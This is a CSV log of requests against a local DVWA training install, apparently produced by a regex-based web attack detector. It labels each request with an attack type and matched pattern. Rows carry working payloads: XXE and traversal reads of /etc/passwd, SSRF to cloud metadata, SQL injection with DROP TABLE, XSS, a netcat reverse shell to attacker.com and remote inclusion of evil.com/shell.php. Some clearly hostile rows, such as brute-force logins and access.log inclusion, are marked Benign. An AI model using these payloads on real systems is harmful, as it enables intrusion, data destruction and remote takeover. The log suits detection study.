Timestamp,Source_IP,URL,POST_Body,Status_Code,attack_type,evidence,detection_method
1764330196.468138,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY test SYSTEM ""file:///etc/passwd"">]><root>&test;</root>",302,Directory Traversal / LFI,Matched regex pattern: '/etc/(passwd|shadow|issue...',Regex
1764330196.707158,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file%3a%2f%2f%2fetc%2fpasswd,,200,Directory Traversal / LFI,Matched regex pattern: '/etc/(passwd|shadow|issue...',Regex
1764330196.944721,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/brute/?username=root&password=toor&Login=Login,,200,Benign,No threat detected,None
1764330197.485994,127.0.0.1,http://paypa1.com/dvwa/index.php,,302,Benign,No threat detected,None
1764330197.990409,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/upload/,,200,Benign,No threat detected,None
1764330198.40222,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=javascript%3aalert%281%29,,200,Cross-Site Scripting (XSS),Matched regex pattern: 'javascript:...',Regex
1764330198.803205,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,,200,Directory Traversal / LFI,Matched regex pattern: 'php://(filter|input|expec...',Regex
1764330199.181777,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file%3a%2f%2f%2fetc%2fpasswd,,200,Directory Traversal / LFI,Matched regex pattern: '/etc/(passwd|shadow|issue...',Regex
1764330199.603244,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&id=999&Submit=Submit,,200,HPP (HTTP Parameter Pollution),Duplicate parameter key with different values: 'id',Regex
1764330200.029185,127.0.0.1,http://faceboook.com/dvwa/index.php,,302,Benign,No threat detected,None
1764330200.450708,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330200.933252,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/upload/,,200,Benign,No threat detected,None
1764330201.173476,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2f..%2fetc%2fpasswd,,200,Directory Traversal / LFI,Matched regex pattern: '\.\./...',Regex
1764330201.406788,127.0.0.1,http://127.0.0.1/dvwa/logo.png,,404,Benign,No threat detected,None
1764330201.612305,127.0.0.1,http://bank-of-america-login.com/dvwa/index.php,,302,Benign,No threat detected,None
1764330201.814418,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330202.008081,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY test SYSTEM ""file:///etc/passwd"">]><root>&test;</root>",302,Directory Traversal / LFI,Matched regex pattern: '/etc/(passwd|shadow|issue...',Regex
1764330202.551051,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http%3a%2f%2flocalhost%3a22,,200,SSRF,Matched regex pattern: '=\s*http://localhost...',Regex
1764330203.089884,127.0.0.1,http://127.0.0.1/dvwa/logo.png,,404,Benign,No threat detected,None
1764330203.41993,127.0.0.1,http://paypa1.com/dvwa/index.php,,302,Benign,No threat detected,None
1764330203.737149,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330204.072857,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3cscript%3ealert%28%27XSS%27%29%3c%2fscript%3e,,200,Cross-Site Scripting (XSS),Matched regex pattern: '<script.*?>...',Regex
1764330204.31971,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330204.588709,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3csvg%2fonload%3dalert%281%29%3e,,200,Cross-Site Scripting (XSS),Matched regex pattern: '(alert|confirm|prompt)\s*...',Regex
1764330204.839873,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY test SYSTEM ""file:///etc/passwd"">]><root>&test;</root>",302,Directory Traversal / LFI,Matched regex pattern: '/etc/(passwd|shadow|issue...',Regex
1764330205.10995,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..%252F..%252F..%252Fwindows%252Fwin.ini,,200,Directory Traversal / LFI,Matched regex pattern: '\.\.%2f...',Regex
1764330205.669091,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,,200,Directory Traversal / LFI,Matched regex pattern: 'php://(filter|input|expec...',Regex
1764330206.206706,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/exec/?ip=127.0.0.1%3b+cat+%2fetc%2fpasswd&Submit=Submit,,200,Command Injection,Matched regex pattern: '(?:;|\||\|\||&&|\n|\$\()\...',Regex
1764330206.605481,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330206.963068,127.0.0.1,http://127.0.0.1/dvwa/logo.png,,404,Benign,No threat detected,None
1764330207.3135,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330207.849814,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330208.373145,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=id%3d1+UNION+SELECT+null%2c+user%28%29%2c+version%28%29&Submit=Submit,,200,SQL Injection,Matched regex pattern: 'union\s+(all\s+)?select...',Regex
1764330208.75418,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330209.121912,127.0.0.1,http://127.0.0.1/dvwa/logo.png,,404,Benign,No threat detected,None
1764330209.538134,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330209.988741,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330210.420013,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2f..%2fetc%2fpasswd,,200,Directory Traversal / LFI,Matched regex pattern: '\.\./...',Regex
1764330210.858504,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http%3a%2f%2f169.254.169.254%2flatest%2fmeta-data%2f,,200,SSRF,Matched regex pattern: '=\s*http://169\.254\.169\...',Regex
1764330211.29343,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,,200,Directory Traversal / LFI,Matched regex pattern: 'php://(filter|input|expec...',Regex
1764330211.86402,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330212.44383,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=id%3d1+UNION+SELECT+null%2c+user%28%29%2c+version%28%29&Submit=Submit,,200,SQL Injection,Matched regex pattern: 'union\s+(all\s+)?select...',Regex
1764330212.770251,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?amount=100&amount=10000&Submit=Submit,,200,HPP (HTTP Parameter Pollution),Duplicate parameter key with different values: 'amount',Regex
1764330213.106054,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=gopher%3a%2f%2f127.0.0.1%3a25%2f_MAIL,,200,SSRF,Matched regex pattern: 'gopher://...',Regex
1764330213.583832,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330214.021055,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY test SYSTEM ""file:///etc/passwd"">]><root>&test;</root>",302,Directory Traversal / LFI,Matched regex pattern: '/etc/(passwd|shadow|issue...',Regex
1764330214.322717,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&id=999&Submit=Submit,,200,HPP (HTTP Parameter Pollution),Duplicate parameter key with different values: 'id',Regex
1764330214.617295,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330214.925532,127.0.0.1,http://127.0.0.1/dvwa/logo.png,,404,Benign,No threat detected,None
1764330215.16998,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330215.436664,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY test SYSTEM ""file:///etc/passwd"">]><root>&test;</root>",302,Directory Traversal / LFI,Matched regex pattern: '/etc/(passwd|shadow|issue...',Regex
1764330215.690667,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file%3a%2f%2f%2fetc%2fpasswd,,200,Directory Traversal / LFI,Matched regex pattern: '/etc/(passwd|shadow|issue...',Regex
1764330215.966862,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/brute/?username=support&password=password&Login=Login,,200,Benign,No threat detected,None
1764330216.52548,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?role=user&role=admin&Submit=Submit,,200,HPP (HTTP Parameter Pollution),Duplicate parameter key with different values: 'role',Regex
1764330217.063948,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330217.388983,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2f..%2fetc%2fpasswd,,200,Directory Traversal / LFI,Matched regex pattern: '\.\./...',Regex
1764330217.732126,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330218.096904,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY test SYSTEM ""file:///etc/passwd"">]><root>&test;</root>",302,Directory Traversal / LFI,Matched regex pattern: '/etc/(passwd|shadow|issue...',Regex
1764330218.563446,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/exec/?ip=127.0.0.1+%26%26+whoami&Submit=Submit,,200,Command Injection,Matched regex pattern: '(?:;|\||\|\||&&|\n|\$\()\...',Regex
1764330219.026431,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/brute/?username=admin&password=admin123&Login=Login,,200,Benign,No threat detected,None
1764330219.344169,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330219.632665,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/upload/,,200,Benign,No threat detected,None
1764330219.929189,127.0.0.1,http://127.0.0.1/dvwa/logo.png,,404,Benign,No threat detected,None
1764330220.185172,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/brute/?username=admin&password=123456&Login=Login,,200,Benign,No threat detected,None
1764330220.673961,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330221.0841,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/exec/?ip=127.0.0.1+%7c+nc+-e+%2fbin%2fsh+attacker.com+1234&Submit=Submit,,200,Command Injection,Matched regex pattern: '(?:;|\||\|\||&&|\n|\$\()\...',Regex
1764330221.594616,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330222.106954,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2f..%2fetc%2fpasswd,,200,Directory Traversal / LFI,Matched regex pattern: '\.\./...',Regex
1764330222.507981,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/brute/?username=root&password=admin123&Login=Login,,200,Benign,No threat detected,None
1764330222.948694,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330223.339281,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://evil.com/shell.php,,200,Shell Upload Attempt,Matched regex pattern: '(web)?shell\.php...',Regex
1764330223.647831,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&id=999&Submit=Submit,,200,HPP (HTTP Parameter Pollution),Duplicate parameter key with different values: 'id',Regex
1764330223.984342,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://evil.com/shell.php,,200,Shell Upload Attempt,Matched regex pattern: '(web)?shell\.php...',Regex
1764330224.211373,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/exec/?ip=127.0.0.1+%7c+nc+-e+%2fbin%2fsh+attacker.com+1234&Submit=Submit,,200,Command Injection,Matched regex pattern: '(?:;|\||\|\||&&|\n|\$\()\...',Regex
1764330224.438858,127.0.0.1,http://127.0.0.1/dvwa/logo.png,,404,Benign,No threat detected,None
1764330224.625269,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=gopher%3a%2f%2f127.0.0.1%3a25%2f_MAIL,,200,SSRF,Matched regex pattern: 'gopher://...',Regex
1764330224.843191,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/exec/?ip=127.0.0.1+%7c+nc+-e+%2fbin%2fsh+attacker.com+1234&Submit=Submit,,200,Command Injection,Matched regex pattern: '(?:;|\||\|\||&&|\n|\$\()\...',Regex
1764330225.07131,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=....%2f%2f....%2f%2fboot.ini,,200,Directory Traversal / LFI,Matched regex pattern: '\.\./...',Regex
1764330225.664746,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file%3a%2f%2f%2fetc%2fpasswd,,200,Directory Traversal / LFI,Matched regex pattern: '/etc/(passwd|shadow|issue...',Regex
1764330226.248129,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/brute/?username=support&password=admin123&Login=Login,,200,Benign,No threat detected,None
1764330226.461843,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=javascript%3aalert%281%29,,200,Cross-Site Scripting (XSS),Matched regex pattern: 'javascript:...',Regex
1764330226.672649,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log,,200,Benign,No threat detected,None
1764330226.87222,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log,,200,Benign,No threat detected,None
1764330227.119855,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3cscript%3ealert%28%27XSS%27%29%3c%2fscript%3e,,200,Cross-Site Scripting (XSS),Matched regex pattern: '<script.*?>...',Regex
1764330227.416865,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log,,200,Benign,No threat detected,None
1764330227.717672,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330227.959132,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=id%3d1+UNION+SELECT+null%2c+user%28%29%2c+version%28%29&Submit=Submit,,200,SQL Injection,Matched regex pattern: 'union\s+(all\s+)?select...',Regex
1764330228.458075,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY test SYSTEM ""file:///etc/passwd"">]><root>&test;</root>",302,Directory Traversal / LFI,Matched regex pattern: '/etc/(passwd|shadow|issue...',Regex
1764330228.938231,127.0.0.1,http://127.0.0.1/dvwa/logo.png,,404,Benign,No threat detected,None
1764330229.361269,127.0.0.1,http://127.0.0.1/dvwa/logo.png,,404,Benign,No threat detected,None
1764330229.580765,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?role=user&role=admin&Submit=Submit,,200,HPP (HTTP Parameter Pollution),Duplicate parameter key with different values: 'role',Regex
1764330229.851906,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/exec/?ip=127.0.0.1+%26%26+whoami&Submit=Submit,,200,Command Injection,Matched regex pattern: '(?:;|\||\|\||&&|\n|\$\()\...',Regex
1764330230.131241,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3csvg%2fonload%3dalert%281%29%3e,,200,Cross-Site Scripting (XSS),Matched regex pattern: '(alert|confirm|prompt)\s*...',Regex
1764330230.493914,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=id%3d1%3b+DROP+TABLE+users&Submit=Submit,,200,SQL Injection,Matched regex pattern: '\b(insert\s+into|update\s...',Regex
1764330230.896925,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file%3a%2f%2f%2fetc%2fpasswd,,200,Directory Traversal / LFI,Matched regex pattern: '/etc/(passwd|shadow|issue...',Regex
1764330231.305299,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/upload/,,200,Benign,No threat detected,None
1764330231.624409,127.0.0.1,http://paypa1.com/dvwa/index.php,,302,Benign,No threat detected,None
1764330231.883889,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/upload/,,200,Benign,No threat detected,None
1764330232.198916,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330232.715705,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log,,200,Benign,No threat detected,None
1764330233.294874,127.0.0.1,http://127.0.0.1/dvwa/logo.png,,404,Benign,No threat detected,None
1764330233.648576,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=gopher%3a%2f%2f127.0.0.1%3a25%2f_MAIL,,200,SSRF,Matched regex pattern: 'gopher://...',Regex
1764330234.043966,127.0.0.1,http://127.0.0.1/dvwa/logo.png,,404,Benign,No threat detected,None
1764330234.19909,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&id=999&Submit=Submit,,200,HPP (HTTP Parameter Pollution),Duplicate parameter key with different values: 'id',Regex
1764330234.349972,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?role=user&role=admin&Submit=Submit,,200,HPP (HTTP Parameter Pollution),Duplicate parameter key with different values: 'role',Regex
1764330234.540206,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330234.731848,127.0.0.1,http://127.0.0.1/dvwa/logo.png,,404,Benign,No threat detected,None
1764330234.889637,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://evil.com/shell.php,,200,Shell Upload Attempt,Matched regex pattern: '(web)?shell\.php...',Regex
1764330235.072863,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330235.605139,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/exec/?ip=127.0.0.1+%7c+nc+-e+%2fbin%2fsh+attacker.com+1234&Submit=Submit,,200,Command Injection,Matched regex pattern: '(?:;|\||\|\||&&|\n|\$\()\...',Regex
1764330236.131334,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/exec/?ip=127.0.0.1+%26%26+whoami&Submit=Submit,,200,Command Injection,Matched regex pattern: '(?:;|\||\|\||&&|\n|\$\()\...',Regex
1764330236.513779,127.0.0.1,http://127.0.0.1/dvwa/logo.png,,404,Benign,No threat detected,None
1764330236.848613,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330237.239784,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=gopher%3a%2f%2f127.0.0.1%3a25%2f_MAIL,,200,SSRF,Matched regex pattern: 'gopher://...',Regex
1764330237.618944,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&id=999&Submit=Submit,,200,HPP (HTTP Parameter Pollution),Duplicate parameter key with different values: 'id',Regex
1764330238.013519,127.0.0.1,http://googl.com/dvwa/index.php,,302,Benign,No threat detected,None
1764330238.170183,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330238.33119,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2f..%2fetc%2fpasswd,,200,Directory Traversal / LFI,Matched regex pattern: '\.\./...',Regex
1764330238.504991,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330238.656355,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330238.818203,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330238.971235,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,,200,Directory Traversal / LFI,Matched regex pattern: 'php://(filter|input|expec...',Regex
1764330239.316106,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,,200,Directory Traversal / LFI,Matched regex pattern: 'php://(filter|input|expec...',Regex
1764330239.689475,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY test SYSTEM ""file:///etc/passwd"">]><root>&test;</root>",302,Directory Traversal / LFI,Matched regex pattern: '/etc/(passwd|shadow|issue...',Regex
1764330240.064266,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330240.541097,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330240.949605,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log,,200,Benign,No threat detected,None
1764330241.363872,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file%3a%2f%2f%2fetc%2fpasswd,,200,Directory Traversal / LFI,Matched regex pattern: '/etc/(passwd|shadow|issue...',Regex
1764330241.643943,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/brute/?username=support&password=password&Login=Login,,200,Benign,No threat detected,None
1764330241.930753,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3cimg+src%3dx+onerror%3dalert%281%29%3e,,200,Cross-Site Scripting (XSS),Matched regex pattern: '(alert|confirm|prompt)\s*...',Regex
1764330242.207559,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/upload/,,200,Benign,No threat detected,None
1764330242.467672,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/exec/?ip=127.0.0.1%3b+cat+%2fetc%2fpasswd&Submit=Submit,,200,Command Injection,Matched regex pattern: '(?:;|\||\|\||&&|\n|\$\()\...',Regex
1764330242.721204,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=id%3d1%27+OR+%271%27%3d%271&Submit=Submit,,200,SQL Injection,"Matched regex pattern: '['\""]\s*(or|and)\s*['\""]...'",Regex
1764330242.99284,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=id%3d1%3b+DROP+TABLE+users&Submit=Submit,,200,SQL Injection,Matched regex pattern: '\b(insert\s+into|update\s...',Regex
1764330243.196133,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2f..%2fetc%2fpasswd,,200,Directory Traversal / LFI,Matched regex pattern: '\.\./...',Regex
1764330243.340628,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/upload/,,200,Benign,No threat detected,None
1764330243.492972,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330243.642335,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2f..%2fetc%2fpasswd,,200,Directory Traversal / LFI,Matched regex pattern: '\.\./...',Regex
